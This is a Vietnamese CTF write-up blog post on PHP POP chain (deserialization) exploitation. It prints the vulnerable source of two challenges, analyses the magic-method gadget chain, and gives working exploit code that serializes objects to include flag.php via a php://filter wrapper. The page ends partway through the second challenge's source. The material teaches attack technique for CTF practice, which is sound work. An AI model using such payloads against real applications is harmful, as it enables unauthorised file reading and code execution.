<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="PHP POP Chain" /><meta name="author" content="to^" /><meta property="og:locale" content="en" /><meta name="description" content="Just a series for php pop chain exploition" /><meta property="og:description" content="Just a series for php pop chain exploition" /><link rel="canonical" href="https://to016.github.io//posts/phpPopChain/" /><meta property="og:url" content="https://to016.github.io//posts/phpPopChain/" /><meta property="og:site_name" content="to^" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-22T22:27:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="PHP POP Chain" /><meta name="twitter:site" content="@nguyendt0" /><meta name="twitter:creator" content="@to^" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"to^"},"dateModified":"2022-05-05T07:41:07+07:00","datePublished":"2022-04-22T22:27:00+07:00","description":"Just a series for php pop chain exploition","headline":"PHP POP Chain","mainEntityOfPage":{"@type":"WebPage","@id":"https://to016.github.io//posts/phpPopChain/"},"url":"https://to016.github.io//posts/phpPopChain/"}</script><title>PHP POP Chain | to^</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="to^"><meta name="application-name" content="to^"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">to^</a></div><div class="site-subtitle font-italic">Student, CTFer, web warrior</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/to016" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/nguyendt0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['todinhnguyen1610','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>PHP POP Chain</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/popChain/pop_chain.png" class="preview-img bg" alt="pop chain logo" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>PHP POP Chain</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1650641220" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-22 </em> </span> <span> Updated <em class="timeago" data-ts="1651711267" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-05 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1349 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p>Ở post này mình sẽ viết về cách khai thác PHP POP Chain mà mình học được qua các bài CTF.</p><p>PHP POP Chain còn được gọi là Code Reuse Attack là một kĩ thuật hoạt động dựa trên việc sử dụng các đoạn code có sẵn (gadget) và liên kết (chain) chúng lại với nhau để làm thay đổi luồng thực thi của chương trình theo ý muốn của attacker.</p><p>Thường thì kĩ thuật này sẽ được áp dụng khi một serialized object được đưa vào hàm <code class="language-plaintext highlighter-rouge">unserialize()</code> và sử dụng đồng thời các <a href="https://www.php.net/manual/en/language.oop5.magic.php">magic methods</a> để chain gadgets lại với nhau.</p><p><img data-src="/assets/img/popChain/pop_chain_step.png" alt="pop chain step" data-proofer-ignore> <em>pop chain step</em></p><h2 id="1-ezpop---mrctf2020"><span class="mr-2">1. Ezpop - mrctf2020</span><a href="#1-ezpop---mrctf2020" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="link-challenge"><span class="mr-2"><em>Link challenge</em></span><a href="#link-challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><a href="https://buuoj.cn/challenges#[MRCTF2020]Ezpop">https://buuoj.cn/challenges#[MRCTF2020]Ezpop</a></p><h3 id="overview"><span class="mr-2"><em>Overview</em></span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/img/popChain/mrctf2020/EzPop/source_code.png" alt="overview" data-proofer-ignore> <em>overview</em></p><h3 id="source"><span class="mr-2">Source</span><a href="#source" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="c1">//flag is in flag.php</span>
<span class="c1">//WTF IS THIS?</span>
<span class="c1">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span>
<span class="c1">//And Crack It!</span>
<span class="kd">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
    <span class="k">protected</span>  <span class="nv">$var</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__invoke</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="k">var</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">Show</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">'index.php'</span><span class="p">){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'Welcome to '</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">source</span><span class="mf">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__toString</span><span class="p">(){</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">str</span><span class="o">-&gt;</span><span class="n">source</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">source</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"hacker"</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="s2">"index.php"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">Test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">p</span><span class="p">;</span>
        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pop'</span><span class="p">])){</span>
    <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pop'</span><span class="p">]);</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
    <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nc">Show</span><span class="p">;</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="phân-tích"><span class="mr-2"><em>Phân tích</em></span><a href="#phân-tích" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><code class="language-plaintext highlighter-rouge">pop</code> get param sẽ được <code class="language-plaintext highlighter-rouge">unserialize</code> nếu được gửi đến server. Lướt lên trên ta thấy class Show có khai báo một magic methods là <code class="language-plaintext highlighter-rouge">__wakeup</code> -&gt; đây là first gadget. Class Modifier có chứa một method đặc biệt <code class="language-plaintext highlighter-rouge">__invoke</code> - “The __invoke() method is called when a script tries to call an object as a function.” -&gt; dùng hàm này để include flag.php -&gt; last gadget.</p><p>Mình sẽ lợi dụng <code class="language-plaintext highlighter-rouge">__toString</code> và <code class="language-plaintext highlighter-rouge">__wakeup</code> của class Show. Hàm <code class="language-plaintext highlighter-rouge">preg_match</code> sử dụng <code class="language-plaintext highlighter-rouge">$this-&gt;source</code> làm tham số thứ 2 vì vậy nếu gán <code class="language-plaintext highlighter-rouge">source = new Show()</code> thì sẽ trigger được <code class="language-plaintext highlighter-rouge">__toString</code></p><p>Tiếp tục hàm <code class="language-plaintext highlighter-rouge">__toString</code> gọi đến <code class="language-plaintext highlighter-rouge">$this-&gt;str-&gt;source</code> suy ra nếu ta gán <code class="language-plaintext highlighter-rouge">str = new Test()</code> thì sẽ tương đương với <code class="language-plaintext highlighter-rouge">new Test()-&gt;source</code> -&gt; trigger <code class="language-plaintext highlighter-rouge">__get</code> của class Test. Tới đây muốn chain tới gadget cuối thì cần gán <code class="language-plaintext highlighter-rouge">p = new Modifier()</code> và ở Modifier gán cho <code class="language-plaintext highlighter-rouge">var='php://filter/convert.base64-encode/resource=flag.php'</code> là xong.</p><h3 id="khai-thác"><span class="mr-2"><em>Khai thác</em></span><a href="#khai-thác" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>exploit code:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
    <span class="k">protected</span> <span class="nv">$var</span> <span class="o">=</span> <span class="s1">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="p">;</span>
<span class="p">}</span>


<span class="kd">class</span> <span class="nc">Test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Modifier</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">Show</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>

<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Show</span><span class="p">();</span>
<span class="nv">$a</span> <span class="o">-&gt;</span> <span class="n">source</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Show</span><span class="p">();</span>
<span class="nv">$a</span> <span class="o">-&gt;</span> <span class="n">source</span> <span class="o">-&gt;</span> <span class="n">str</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Test</span><span class="p">();</span>

<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p><img data-src="/assets/img/popChain/mrctf2020/EzPop/send_payload.png" alt="send payload" data-proofer-ignore> <em>send payload</em></p><p><img data-src="/assets/img/popChain/mrctf2020/EzPop/flag_php.png" alt="flag.php" data-proofer-ignore> <em>flag.php</em></p><blockquote class="prompt-info"><div><p>flag{9f937575-162d-4d4b-8030-c8859c08ac19}</p></div></blockquote><hr /><h2 id="2-ezpop---eis2019"><span class="mr-2">2. EzPOP - EIS2019</span><a href="#2-ezpop---eis2019" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="link-challenge-1"><span class="mr-2"><em>Link challenge</em></span><a href="#link-challenge-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><a href="https://buuoj.cn/challenges#[EIS%202019]EzPOP">https://buuoj.cn/challenges#[EIS%202019]EzPOP</a></p><h3 id="source-1"><span class="mr-2"><em>Source</em></span><a href="#source-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="kd">class</span> <span class="nc">A</span> <span class="p">{</span>

    <span class="k">protected</span> <span class="nv">$store</span><span class="p">;</span>

    <span class="k">protected</span> <span class="nv">$key</span><span class="p">;</span>

    <span class="k">protected</span> <span class="nv">$expire</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$store</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'flysystem'</span><span class="p">,</span> <span class="nv">$expire</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="nv">$key</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">store</span> <span class="o">=</span> <span class="nv">$store</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">expire</span> <span class="o">=</span> <span class="nv">$expire</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">cleanContents</span><span class="p">(</span><span class="kt">array</span> <span class="nv">$contents</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$cachedProperties</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">([</span>
            <span class="s1">'path'</span><span class="p">,</span> <span class="s1">'dirname'</span><span class="p">,</span> <span class="s1">'basename'</span><span class="p">,</span> <span class="s1">'extension'</span><span class="p">,</span> <span class="s1">'filename'</span><span class="p">,</span>
            <span class="s1">'size'</span><span class="p">,</span> <span class="s1">'mimetype'</span><span class="p">,</span> <span class="s1">'visibility'</span><span class="p">,</span> <span class="s1">'timestamp'</span><span class="p">,</span> <span class="s1">'type'</span><span class="p">,</span>
        <span class="p">]);</span>

        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$contents</span> <span class="k">as</span> <span class="nv">$path</span> <span class="o">=&gt;</span> <span class="nv">$object</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$object</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$contents</span><span class="p">[</span><span class="nv">$path</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_intersect_key</span><span class="p">(</span><span class="nv">$object</span><span class="p">,</span> <span class="nv">$cachedProperties</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">getForStorage</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$cleaned</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">cleanContents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache</span><span class="p">);</span>

        <span class="k">return</span> <span class="nb">json_encode</span><span class="p">([</span><span class="nv">$cleaned</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">complete</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">save</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$contents</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getForStorage</span><span class="p">();</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">store</span><span class="o">-&gt;</span><span class="nf">set</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">expire</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">autosave</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">B</span> <span class="p">{</span>

    <span class="k">protected</span> <span class="k">function</span> <span class="n">getExpireTime</span><span class="p">(</span><span class="nv">$expire</span><span class="p">):</span> <span class="kt">int</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span> <span class="nv">$expire</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">getCacheKey</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$name</span><span class="p">):</span> <span class="kt">string</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'prefix'</span><span class="p">]</span> <span class="mf">.</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">protected</span> <span class="k">function</span> <span class="n">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">):</span> <span class="kt">string</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="nv">$data</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$serialize</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'serialize'</span><span class="p">];</span>

        <span class="k">return</span> <span class="nv">$serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">set</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$expire</span> <span class="o">=</span> <span class="kc">null</span><span class="p">):</span> <span class="kt">bool</span><span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">writeTimes</span><span class="o">++</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$expire</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$expire</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'expire'</span><span class="p">];</span>
        <span class="p">}</span>

        <span class="nv">$expire</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getExpireTime</span><span class="p">(</span><span class="nv">$expire</span><span class="p">);</span>
        <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getCacheKey</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>

        <span class="nv">$dir</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="mo">0755</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="err">\</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// Failed to create</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'data_compress'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">'gzcompress'</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// data compression</span>
            <span class="nv">$data</span> <span class="o">=</span> <span class="nb">gzcompress</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"&lt;?php</span><span class="se">\n</span><span class="s2">//"</span> <span class="mf">.</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">'%012d'</span><span class="p">,</span> <span class="nv">$expire</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2"> exit();?&gt;</span><span class="se">\n</span><span class="s2">"</span> <span class="mf">.</span> <span class="nv">$data</span><span class="p">;</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>

